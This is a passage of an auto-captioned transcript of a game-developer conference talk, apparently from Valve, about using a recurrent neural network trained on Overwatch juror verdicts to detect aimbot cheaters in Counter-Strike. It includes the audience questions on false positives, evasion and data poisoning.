[36:44] one requires kind of a little bit more
[36:46] unpacking what we what we needed was
[36:49] basically the sort of Delta view angle
[36:51] pitch and so what that means is like for
[36:54] about a half second before the shot and
[36:56] up through every tick until a quarter
[36:58] second after the shot we basically say
[37:01] like what is your delta pitch on this
[37:03] tick versus the previous tick and we
[37:06] just repeatedly do that and a half
[37:08] second before and quarter second after
[37:10] which sort of chosen purely capriciously
[37:13] but we take all of those and we stuff
[37:15] them into our atom and if you've been
[37:17] watching the atom you might have noticed
[37:18] that like everything lands in the same
[37:21] place every time like we make sure that
[37:23] all of the data lands in the same place
[37:25] every time because deep learning doesn't
[37:27] really care where it is but it cares
[37:29] that it's consistent every time like
[37:31] that is a necessary property in order
[37:32] for it to learn so then with a delta
[37:36] view angle sorry I probably should have
[37:38] clarified and I will do that right now
[37:40] the view angle is obviously just like
[37:42] the way that you're kind of looking
[37:43] around and before we were looking only
[37:46] at pitch which is basically your up and
[37:47] down so we were like hey like you looked
[37:50] up one degree hey you looked up two
[37:51] degrees and then we need the same thing
[37:53] for yaw so we want to know like now
[37:55] right to left how much did your view
[37:59] angle adjust right to left but only as
[38:01] can express as a delta against the
[38:03] previous tic like I turned right one
[38:05] degree I turned right two degrees and
[38:07] we're only doing this around in the
[38:08] windows around when you take a shot and
[38:10] so we do this again half second before
[38:13] and a quarter second after and this was
[38:15] sort of picked purely capriciously and
[38:17] then we stuff that thing into our atom
[38:19] of stuff and so we have our X right well
[38:23] not really because if you recall our
[38:25] training data is not that this
[38:29] particular shot came from a TV demo and
[38:31] this particular shot did not come from a
[38:33] 2d demo our data is labeled where it's
[38:36] like hey in this eight round window
[38:38] something somewhere in here triggered a
[38:41] juror to decide that this behavior was
[38:45] Chiddy and and convicted and it's re
[38:47] convict it convinced a bunch of jurors
[38:49] that that this behavior was cheating so
[38:52] we can't just use one atom because this
[38:54] is only the information about one shot
[38:56] we need like a sequence of them we need
[38:59] like big sequence of them and in fact
[39:02] actually what we want is a hundred and
[39:03] forty of them or at least that's what
[39:05] the model uses right now it's also sort
[39:07] of purely capricious and I will make a
[39:10] slight apology because this is a cube of
[39:13] meat to go with the metaphor we've been
[39:15] doing but actually it is just a serial
[39:17] representation of 140 shots we just take
[39:20] 140 out of an eight round window and we
[39:23] stuff those into the model and then
[39:25] we're like hey if you if you were to
[39:27] present the sequence of 140 shots to a
[39:31] juror what is the likelihood you would
[39:33] get a conviction okay so I spend a bunch
[39:38] of time early in the talk talking about
[39:40] how we can't talk about anti cheat
[39:42] because talking about anti cheat makes
[39:44] it not work anymore so did I just spend
[39:47] 40 minutes like lighting this technique
[39:49] on fire it's like a year of work overall
[39:51] I mean we deployed it in like four
[39:53] months we're pretty excited about that
[39:54] but like did we just like this thing on
[39:55] fire
[39:56] and the good news is no no we didn't
[39:58] it's great let's talk about why we
[40:00] didn't light it on fire so if you recall
[40:02] my original sort of elevator pitch was
[40:04] like hey we're gonna train data from vac
[40:06] net sorry from overwatch and then we're
[40:08] gonna have it monitor matches and we're
[40:09] gonna submit cases and the players have
[40:11] been determine guilt and the reason that
[40:13] we didn't like this thing on fire is
[40:14] because we're actually gonna do that
[40:16] thing in a loop we're just gonna do it
[40:17] over and over and over and over again
[40:20] and because we're using overwatch and we
[40:23] didn't actually replace all player
[40:24] reports we just supplemented player
[40:26] report behaviors that means that the
[40:29] learner is getting the opportunity to
[40:31] evolve along with human jurors so as
[40:34] human jurors identify sort of new GE
[40:37] behavior the learner has the opportunity
[40:40] to do the same thing so you can think
[40:43] about this a little bit like imagine
[40:45] that you're a chief developer there
[40:48] might actually be one of the audience
[40:49] I'm not sure but your chief developer
[40:51] and you're like aha all I need to do is
[40:54] make my cheat look GT three quarters of
[40:58] a second before shot and then look
[41:01] totally normal through the half second
[41:03] and then get the kill and then move on
[41:06] now I think that's extremely improbable
[41:08] in the first place but it actually won't
[41:10] work anyways for two reasons and one is
[41:13] that human jurors will just be like yeah
[41:15] dude I don't care that looks GT like
[41:17] Boop conviction and then the learner
[41:19] will retrain and they'll be like I don't
[41:21] know why locking on in this particular
[41:23] way is considered to be cheating to
[41:24] humans but in order for me to do the
[41:26] best job I can do I need to label that
[41:28] as cheating so it will just learn the
[41:30] thing and the other reason is that even
[41:32] if that didn't work
[41:33] retrain like we chose half a second
[41:36] before and a quarter second afterwards
[41:37] just totally capriciously we could just
[41:40] make it three seconds before in two
[41:41] seconds afterwards and model would be
[41:43] just as happy it doesn't care it would
[41:45] effectively result in us saying like oh
[41:48] we need to retrain so let me take the
[41:51] five seconds to find the command in my
[41:54] command history and press the button to
[41:56] start the retraining and then that'll
[41:58] run for six hours and when it's done now
[42:01] it's happy with looking at stuff for
[42:04] that one
[42:05] all right so I think we're mostly the
[42:08] way through let's talk a little bit
[42:11] about sort of ongoing in your term work
[42:13] that that that's going on around this
[42:15] we're doing so one of the things is like
[42:18] I mentioned like right now when we
[42:20] retrain we still sort of just go and
[42:22] look at like we basically just look at
[42:26] like how is it doing and then we decide
[42:27] like okay now seems like a reasonable
[42:29] time I'm gonna go retrain and I don't
[42:31] think that's actually the right answer I
[42:33] think the right answer is to just
[42:34] totally get us out of the loop and
[42:35] instead basically just say hey like on a
[42:38] cron job this should just once a day
[42:40] retrain and then if it's convicting more
[42:45] stuff than the previous version then
[42:47] then we should just deploy that one and
[42:50] we should just make that heuristic based
[42:51] and get totally out of the loop the
[42:53] other thing that we're kind of working
[42:55] on is basically new learners and the
[43:01] learner that we built the features that
[43:02] we built are sort of based around
[43:04] catching aimbots
[43:05] but we actually think and part of that
[43:08] was because we didn't have enough data
[43:09] yet that we were willing to sort of go
[43:11] whole hog on this but we think that a
[43:13] better approach is actually instead to
[43:16] just sort of build a first-person
[43:17] narrative for each of the players in the
[43:20] round and say like I don't know what
[43:22] matters in here at all and I don't want
[43:25] to do any input engineering
[43:27] I just want to basically say like here
[43:29] is a first-person narrative for this
[43:30] player if you take eight round windows
[43:33] of this first-person narrative does that
[43:35] look more like a cheesy first-person
[43:36] narrative or more like an on TV
[43:38] first-person narrative and we think that
[43:40] that model is much more likely to be
[43:43] able to attack the other types of
[43:45] cheating' that that we see so like wall
[43:47] hacks and it's been so on the other
[43:50] thing that we've been kind of working on
[43:52] is like generalizing back nets other
[43:54] game modes so we deployed to we have a
[43:57] 2v2 competitive mode that's pretty
[43:59] popular and we deployed to that a few
[44:01] weeks ago and the conviction rate in
[44:03] that mode was like 99 percent for a
[44:05] while it was great
[44:06] cheaters didn't get the memo that we
[44:08] were doing it and players were super
[44:09] happy and we're just busting cheaters
[44:11] left and right I felt so good
[44:15] finally we're actually looking to
[44:17] generalize back Nets esteem we think
[44:19] that the model both the model we have in
[44:21] the model that we're moving towards
[44:22] should actually with a relatively small
[44:25] number of examples should generalize to
[44:28] other initially first-person shooters
[44:31] but then later to just other games in
[44:34] general and we're definitely looking for
[44:36] partners to make that happen so if
[44:37] that's the thing that you're interested
[44:38] in
[44:39] we should talk alright let's finish up
[44:46] so basically I think hopefully I maybe
[44:49] convince you a little bit of this but
[44:51] our sort of opinion at valve is that
[44:53] deep learning is just this sea change
[44:55] technology for evolutionary behavior we
[44:57] think that it is really actually helping
[44:59] us get developers off of the treadmill
[45:01] without impacting our customers in any
[45:04] way like our customers are seeing fewer
[45:07] cheaters today than they have been in
[45:09] the conversation around cheating has
[45:10] died tremendously compared to where it
[45:13] was before we started this work like I
[45:17] think the volume and as I'm sorry to
[45:19] give a crappy anecdote but I think the
[45:21] volume based on csgo team feedback and
[45:23] and sort of eyeballing the steam forums
[45:27] and reddit it's like the volume of the
[45:29] conversation it's probably 1% as loud as
[45:31] it was before we started this now we're
[45:34] applying deep learning to a bunch of
[45:36] problems at valve there's anti cheat and
[45:38] anti-fraud dota hero selection uses deep
[45:40] learning in it ship to week and a half
[45:42] ago there's some other dota stuff that's
[45:44] more complicated and I don't want to
[45:46] explain dota so I'm not going to talk
[45:47] about it but that's stuff ship using
[45:49] deep learning as well and and there's a
[45:53] bunch of other work going on as well so
[45:55] I mentioned before I would not try and
[45:59] teach you deep learning which I
[46:00] successfully avoided and instead I would
[46:03] point you at some resources the
[46:05] foundational work I would sort of
[46:07] suggests this Udacity course is really
[46:10] useful if you are a super high level
[46:11] user and you do not give a crap about
[46:14] how the insides work the Udacity course
[46:17] is actually great like you will come
[46:18] away with an understanding of like sort
[46:21] of how to build systems that use deep
[46:23] learning but you will definitely not
[46:25] understand the guts meanwhile the
[46:27] Coursera course the machine
[46:28] learning course will help you really
[46:30] like actually build the pieces from the
[46:32] ground up so if you're kind of more like
[46:34] me where you're like now I need to see
[46:35] how the sausage is made at least once
[46:37] I recommend the Coursera course they're
[46:39] both about they're each about 30 hours
[46:42] of study you know that you can do sort
[46:45] of at your own pace and they're both
[46:46] great I recommend them both additionally
[46:48] once you've done that and I point you at
[46:50] the machine learning courses because it
[46:52] turns out everything that you or at
[46:54] least most of the things that you learn
[46:55] around machine learning will be super
[46:57] super helpful at understanding deep
[46:58] learning
[46:59] but once you've basically done either of
[47:01] those I suggest basically jumping into
[47:03] either the Coursera course that's deep
[47:06] learning specific on Coursera or the
[47:09] Stanford course CS 231 in with
[47:12] faithfully the all of the material is
[47:16] online except for the lectures good news
[47:18] is there a bootleg version of all of the
[47:20] lectures on YouTube I highly recommend
[47:22] the ones with Andre karpati but they're
[47:24] all good and so you can go through the
[47:27] basically the whole course alright so
[47:30] hopefully people have some interesting
[47:33] questions if you have questions please
[47:35] walk to the mics I did want to mention
[47:37] that sort of the whole thrust of the
[47:39] talk is like how we can sort of increase
[47:40] value that we deliver to customers and
[47:43] deep learning is an important piece of
[47:44] that bike the other way is like to just
[47:46] get more awesome people at valve so if
[47:48] you thought this was interesting you
[47:50] should definitely apply at Belk
[47:51] software.com slash jobs and also while
[47:54] it sorry one more thing is please fill
[47:56] out surveys
[47:56] pretty please okay I'm gonna say you
[47:58] were there first but I'm not positive oh
[47:59] so I know vegetarians but oh okay I'm
[48:02] fine I'm fine with that farm anyway so
[48:04] there's the there's the pod there's the
[48:05] project I heard people working on that
[48:07] with the Unreal Tournament
[48:08] so we're people with that you're using
[48:10] machine learning to Train Brobot to play
[48:12] like a human so do you actually see that
[48:14] the concern in just problems faced I see
[48:17] so the question is am i concerned that
[48:19] somebody will basically counter my deep
[48:21] learning approach with a deep learning
[48:23] approach trying to play like a human so
[48:25] note that is a really good that is a
[48:28] really good question
[48:30] maybe so there might be a little deep
[48:33] learning specific apologize there's
[48:36] maybe an attack with gans that might
[48:38] sort of yield fruit but I don't know for
[48:41] sure
[48:41] that
[48:42] definitely something that somebody would
[48:43] have to spend a lot a lot a lot of
[48:45] compute timeline so that translates to
[48:47] them spending a lot a lot a lot of money
[48:49] and otherwise they just don't have the
[48:52] data like a slide that I didn't have
[48:54] about here up here but that's sort of
[48:56] fascinating about deep learning is that
[48:57] it turns out that the algorithm you pick
[49:00] in deep learning and machine learning it
[49:02] doesn't matter the thing that matters is
[49:05] more data like more data wins and so the
[49:07] problem is somebody is going to either
[49:09] need to outspend the amount of data that
[49:11] I have because I have lots of data and
[49:13] also I could just do the same thing or
[49:16] they're they're gonna need more data
[49:19] than I have and they definitely don't
[49:21] have that so that's a good question
[49:23] Thanks yeah when you show the rainbow
[49:26] slide
[49:27] you said rainbow trust was very robust
[49:29] that you weren't sure about any of the
[49:32] players but you were more sure that some
[49:33] of them were more likely to be cheaters
[49:35] right that's right so in order to make
[49:38] better experience for the blue guys yeah
[49:41] five of the red guys who aren't cheaters
[49:43] but for some reason you mislabeled them
[49:45] as untrustworthy because they're not
[49:47] cheaters
[49:48] you just think they're more likely
[49:49] you're going to ruin their experience
[49:50] like completely right aren't you worried
[49:53] that I'm going to make them turns in
[49:55] order to make the others so experienced
[49:57] yeah so we so that's definitely a
[50:00] concern for trust like that's definitely
[50:02] a thing that players are concerned about
[50:03] but we haven't seen it actually bear
[50:05] fruit like when that model also tends to
[50:09] be very conservative so we're actually
[50:11] despite what I'm showing here we're
[50:12] actually more likely to accidentally
[50:14] slip somebody who is a cheater into blue
[50:16] than we are to get somebody who's red to
[50:20] accidentally qualify somebody who's
[50:21] oranges red so now if you command using
[50:24] these if you really sure that they're
[50:25] cheaters yeah you want to be sort of
[50:27] very you want to be certain that they
[50:30] are very likely to go on to be cheers
[50:31] like most of the people that get caught
[50:33] there have are actually in the situation
[50:35] that I gave the anecdote about where
[50:37] they have many accounts and most of them
[50:40] have been back then okay thank you
[50:42] hey yeah so I'm a big fan of you guys
[50:45] using K humans in the loop to make sure
[50:48] you don't have false positives but how
[50:51] are you planning on extending this
[50:53] therefore it for like
[50:55] you're asking for partners for this and
[50:57] partners may not have the level of
[50:59] community participation that but you Val
[51:03] does yeah that's a good question um we
[51:06] thought that far yet I think that
[51:07] probably it's possible that the actual
[51:11] feature would be the whole thing like
[51:13] overwatch and everything that's one
[51:15] possible approach the other would be to
[51:18] use something like this maybe instead to
[51:21] basically to feed into something like
[51:23] trust score where you're like I'm not
[51:25] taking as nearly as harsh in action like
[51:28] I'm not banning you and taking away your
[51:29] stuff instead I'm just like yeah I don't
[51:31] quite trust you as much so I'm gonna
[51:33] stick you with other people who I don't
[51:35] trust quite as much so I think like soft
[51:37] punishments might be a better choice for
[51:39] a smaller partner that's a good question
[51:40] thank you okay there are you seeing an
[51:43] increase between the overlap of cheaters
[51:45] that are really bad players and actual
[51:47] legitimate good players and how do you
[51:49] deal with those scenarios I'm not sure
[51:52] that I understand can you rephrase that
[51:53] so at some point a very good player is
[51:56] gonna look like a cheater how do you
[51:58] deal with Donson I see it turns out so
[52:02] overwatch so the question is how do you
[52:04] tell the difference between somebody
[52:06] who's just really good at the game and a
[52:07] cheater right and it turns out that the
[52:13] things that overwatch is good at
[52:14] catching are not like overwatch doesn't
[52:17] catch subtle cheaters because we ask
[52:18] players like don't convict if you're not
[52:20] sure and so they're like that is
[52:22] plausibly just a player that's really
[52:24] good and so they just take the
[52:26] not-guilty button and we we've sort of
[52:29] hand verified that tons and tons of
[52:31] times that like hey let's spot check
[52:33] convictions and make sure that like
[52:34] people are still not convicting things
[52:35] that they shouldn't be and we haven't
[52:38] found a single case of it that's not to
[52:39] say there hasn't been like one case and
[52:41] all of overwatch like there probably has
[52:43] but but but we haven't seen it yeah okay
[52:46] are you at all concerned about the
[52:48] possibility now that your secret is out
[52:50] of cheap developers polluting your data
[52:53] pool by putting ringers in your juries
[52:57] am I worried about
[52:59] so am I worried now that I've basically
[53:01] shown everything about cheaters
[53:04] polluting my data
[53:08] they'll try I'm not really too worried
[53:11] about it because humans should be able
[53:12] to tell the difference like that's kind
[53:14] of the fundamental premise that we're
[53:15] going on and so if humans decide that
[53:19] that behavior is cheated then the
[53:20] learner should decide that it's GT as
[53:21] well but it's possible like it's
[53:24] definitely we'll see maybe I'll be back
[53:25] in GGC 2019 I'll be like don't talk
[53:27] about cheating Everett this was a
[53:29] terrible mistake but I don't think so
[53:31] that's a good question great talk and
[53:34] great analogy I really like the office
[53:37] again sorry they remind me of the burger
[53:40] I had yesterday the super duper I have
[53:44] two questions first one is about the the
[53:46] actual data shape like you showed it the
[53:49] cube shape data but I don't think that
[53:52] is actually Q no no it is not a gas I
[53:54] was wondering like is it like a the one
[53:56] user was represented as a a long vector
[53:59] or max of yeah so what it is is it is
[54:03] actually it is totally a sort of serial
[54:06] data
[54:07] it's just serial data doesn't look very
[54:09] good on its spine but it is basically
[54:11] just like here's all of the information
[54:13] about a shot and then repeated 140 times
[54:16] and if a player I didn't really talk
[54:20] about this at the time but like if a
[54:21] player shoots say 200 times in an 8
[54:24] round window then we just build a hunt
[54:25] like 60 140 shot windows and we ask to
[54:29] inference all of them would any of these
[54:31] results in the conviction oh wait but
[54:33] there are y'all like it's like you could
[54:35] just sort of imagine the time line where
[54:36] somebody takes a shot every single time
[54:38] they take a shot and then we're like
[54:40] great let's look at like that is art the
[54:42] whole timeline and then let's build
[54:44] sliding windows of 140 and see if any
[54:47] sliding windows will result in a
[54:49] conviction
[54:50] I see and my next question is about the
[54:52] deep learning architecture if you oh I
[54:55] have a slide for this let's here I'm
[54:57] just gonna burn oh wait maybe I can no
[54:59] I'm sure it won't sorry maybe I can skip
[55:04] to the no no point this that I'm so
[55:07] pissed about those graphs so I actually
[55:09] have the slide for exactly what our
[55:11] architecture is and I am I'm so glad I
[55:17] kept this one in so we use in our I'm
[55:20] sorry for not a deep learning
[55:21] we use an iron in because we have
[55:23] sequence data and the only sort of weird
[55:25] thing is like we're actually using GRU
[55:28] and Ray Lewin actually works better most
[55:31] of the time Ray Lewis aware training a
[55:34] model it'll just be like I just can't
[55:35] converge but actually most of the time
[55:38] it does converge and it does
[55:39] significantly better than to an H so
[55:42] that is surprising and otherwise this
[55:45] stuff is all just totally purely
[55:47] capricious like we just searched we just
[55:49] did like a grid search and we treated
[55:51] all of the architecture like a hyper
[55:53] parameter you know like a set of hyper
[55:54] parameters at all as well and that is
[55:57] like the thing that currently works the
[55:59] best good change tomorrow but that's
[56:00] what it is today
[56:01] I was wondering if you have also tried
[56:04] like one-dimensional convolutional
[56:05] neural network which is high on my list
[56:08] of things to try hi so as a person who
[56:13] does a lot of overwatch cases it's kind
[56:15] of interesting to see how you're using
[56:16] this data hold on thank you for your
[56:18] service yeah so I'm kind of curious
[56:22] about the more subtle cases cuz just
[56:24] speaking purely as a person who does
[56:25] does overwatch cases is there are a lot
[56:28] of times when you aren't certain and I
[56:32] think the language is actually really
[56:33] good about really convincing you that
[56:35] you really have to be very evidence
[56:38] beyond a reasonable doubt it's very you
[56:40] know very precise yeah legally precise
[56:42] ends up when we get talks so I'm kind of
[56:44] curious about about how you go to
[56:46] approach the subtle case and if maybe
[56:48] you could talk a little bit about how to
[56:50] tackle that if it's going to be like an
[56:52] unsupervised approach that maybe bears
[56:54] fruit there or I yeah so I think I think
[56:59] an unsupervised approach is gonna have
[57:00] to be the answer like I think again
[57:03] sorry deep learning little nerding I
[57:05] pretty sure it's gonna need to be an
[57:07] unsupervised approach and I think
[57:08] probably it'll be around outlier
[57:10] analysis but I haven't done much work on
[57:12] it yet but I think that's probably the
[57:15] only thing to do the thing that's a
[57:17] little trickier for for that is actually
[57:21] like the policy decision around it
[57:24] instead of the like hey like given that
[57:27] I make that thing work now what do I do
[57:29] because like humans are not convicting
[57:31] that and like I would need to have of
[57:33] like extreme
[57:35] high confidence that a person was
[57:37] cheating in a subtle way before I would
[57:39] be willing to take action against them
[57:41] because like I'm putting a black mark on
[57:42] their Steam account I'm taking their
[57:43] stuff away like they don't kids are
[57:45] playing back secured servers so we need
[57:47] to be sort of very very careful around
[57:49] what we do punitive ly in that situation
[57:53] but it may be that you feed it into
[57:54] trust and then you're just like right I
[57:56] think it's also interesting have you
[57:58] done experiments with with how to create
[58:00] effects this I'm sorry how what how to
[58:03] creat effects okay great because you
[58:06] have a relatively high tick rate at 64
[58:09] which gives you sort of a lot of
[58:11] moment-by-moment data and I don't know
[58:13] if having higher tick rate or a lower
[58:15] tick rate evaluation of this has any
[58:18] impact so over watch cases are actually
[58:21] handed down only a 32k there are already
[58:23] stepped down and so we actually just
[58:25] work on that day okay just thank you
[58:27] cool I think I have like time for one or
[58:29] two more questions probably although
[58:30] were the last people in the room so
[58:32] maybe we can go a minute or two long
[58:33] maybe okay cool kind of dragging on it
[58:38] here's my tool of counter strike by the
[58:39] way you play law and everything going on
[58:43] with that right you definitely I think
[58:45] the data part will always win
[58:47] you guys always have the data and you
[58:49] can always get the data so I'm sold on
[58:51] the machine learning part but when
[58:52] steamos came out I was actually hoping
[58:55] you know we've got twitch going big and
[58:58] we've got people making entire
[58:59] livelihoods on this now and it made me
[59:02] wonder why you know we have secure boot
[59:05] we have all these systems now couldn't
[59:08] we create you know in addition to this
[59:10] could we not create a secure system in
[59:13] such that it's like for contestant play
[59:16] you have to boot these sort of encrypted
[59:20] images that are a whole lot more secure
[59:21] I mean this is a whole other combo no
[59:23] but it allows you to do the things like
[59:26] hey did he actually move his Mouse
[59:28] physically like did I get X Y input from
[59:30] that hey did the DLLs exactly mat you
[59:33] know I'm doing checksums and you know so
[59:36] we've thought about this and like I
[59:38] actually that was kind of the approach I
[59:40] ran down initially and there are sort of
[59:43] a few problems around it yeah us to go
[59:46] yeah I think the easy
[59:49] one is like that I feel super invasive
[59:52] right like as a user like I'm like hey
[59:55] what you need to do is play my game on
[59:57] like my OS and you need to sing and like
[59:59] I don't know like and the problem is
[60:01] ultimately at the end of the day if the
[60:04] user has access to their to their system
[60:06] physical access there is nothing I can
[60:08] do to determine for certain that they
[60:11] haven't tampered with it like because
[60:12] any query that you're like well you just
[60:14] ask them this I'm like so what I do is I
[60:16] hijack that function and I lie because I
[60:18] did that I've like I've done that yeah
[60:19] works great like it's it's Turtles all
[60:22] the way down ah but it may not be and
[60:25] maybe we should talk yeah hey great talk
[60:29] um quasi related because you mentioned
[60:32] like reddit in the forum's a lot at any
[60:34] point is you develop something to sort
[60:36] of scour those in terms of watching
[60:38] trends for like no we haven't been maybe
[60:41] we should the question is like do we
[60:43] have tools to scour read it and like
[60:45] quantify things better and other forums
[60:47] we don't but maybe we should like that
[60:50] that feels like a thing that actually
[60:51] and you know performing sentiment
[60:54] analysis in particular being like hey is
[60:56] there like a new topic that is currently
[60:58] lighting the internet on fire like that
[61:00] might actually be a pretty valuable
[61:02] thing but it's not a thing that we have
[61:04] right now look yes that would be that
[61:05] would be great though okay two questions
[61:07] first
[61:07] great talk Thanks so firstly how long
[61:11] does it take to train the data and hours
[61:14] data do you use so we have about 700,000
[61:19] labeled pieces of data now and it takes
[61:21] about six hours to train on an ADT I
[61:25] well I'm once an 80s guy we're actually
[61:27] working on parallelizing it and feeding
[61:30] it to a bunch of via one hundreds so
[61:32] we'll bring that down to ten minutes or
[61:35] so
[61:35] pretty soon cool and the second question
[61:38] have hackers tried to play the overwatch
[61:41] system and ads um people who just pass
[61:44] everything No well sorry
[61:48] maybe maybe they've tried but it but one
[61:52] of the things that we do in overwatch is
[61:53] we pay attention to how good you are at
[61:56] overwatch like how often you go and
[61:58] agree with the consensus and so somebody
[62:00] who is just like not guilty not guilty
[62:01] not guilty
[62:02] guilty and they do that repeatedly on
[62:05] cases that get convicted or the other
[62:07] way like they try and pollute it the
[62:08] other way they get they get basically to
[62:11] the point where we're like you can keep
[62:12] doing cases but I don't believe you
[62:14] anymore so have a good time yeah it's
[62:18] good
[62:18] hi Hey um it'll probably last year just
[62:23] sort yeah thanks a lot for the talk now
[62:24] I really know what's your next game
[62:26] gonna be it's a VR simulator of meat
[62:29] grinder that's right be right there sign
[62:31] me up for that but actually I have a
[62:34] question from a different point you know
[62:36] obviously you're talking about real
[62:38] customers the real players playing and
[62:41] that's why you have created that system
[62:42] I work for a competitive play so we see
[62:46] lots and lots of games happen when
[62:48] people play for extra money and I think
[62:50] years ago is the biggest game in this
[62:51] amount in terms of in terms of volume
[62:53] actually not so many tournament
[62:55] organizers running so many tournaments
[62:57] so many games are being played and the
[63:00] level of cheating there is slightly
[63:02] different people are using enhancement
[63:04] drugs because wrong matches and I'm just
[63:07] curious is there a way for a deep
[63:10] learning network to try to serve
[63:12] ciphered through that thing or we as
[63:15] tournament organizers should look
[63:16] elsewhere obviously we are doing it on
[63:19] physically one lands happen everything's
[63:21] secure there but I'm more curious about
[63:23] online qualifiers so the question is
[63:26] basically how do we do this for pros
[63:28] right or how do we do this for as
[63:30] tournament organizers and I think that
[63:33] there probably is an approach there that
[63:36] works but I don't have enough confidence
[63:39] to talk about it right the second but it
[63:42] is definitely a thing that we're
[63:43] thinking a lot about because we think
[63:45] the you know the integrity of the pro
[63:47] scene is super important like it's it's
[63:49] really really important so it's
[63:51] definitely a thing that we're thinking
[63:52] about but I'm not quite ready to talk
[63:54] about exactly how we think it'll work
[63:56] yeah thank you it's a great question
[63:59] that's one
[63:59] hey I'm wondering how many of your
[64:02] players have to weigh in on to an
[64:04] overwatch case before it closed one way
[64:07] or another and how many overwatch case
[64:09] do you close every day so I can't
[64:13] comment on the second one because the
[64:16] team agreed
[64:16] it probably was not actually that useful
[64:19] to talk about the first question how
[64:22] many players need to weigh in so it kind
[64:26] of it varies I'm trying to answer and
[64:30] not be hand-wavy
[64:31] but it kind of depends on how long it
[64:33] takes to converge like cases can be sort
[64:36] of rejected like if you get if you just
[64:38] happen to randomly hand the case out to
[64:40] a bunch of people who it turns out are
[64:41] like they are always right they always
[64:43] go with consensus then maybe it takes as
[64:46] few as seven of them to agree that that
[64:49] a person is you know this thing is super
[64:52] guilty or this person is definitely not
[64:54] guilty
[64:55] it might take as many as 50 or 100 if
[64:59] it's something that's like a little sort
[65:01] of less certain or if you know they're
[65:03] people that are new to overwatch and
[65:05] we're not sure you know about how good
[65:07] they are at identifying the conviction
[65:09] rates alright thank you guys so much for
[65:11] sticking around through the graveyard
[65:12] shift I really appreciate that it's
[65:15] great

=== Content from mobile.twitter.com_3185d938_20250115_140102.html ===



=== Content from twitter.com_e59ba2fe_20250115_140027.html ===



=== Content from twitter.com_f9a42921_20250115_140058.html ===


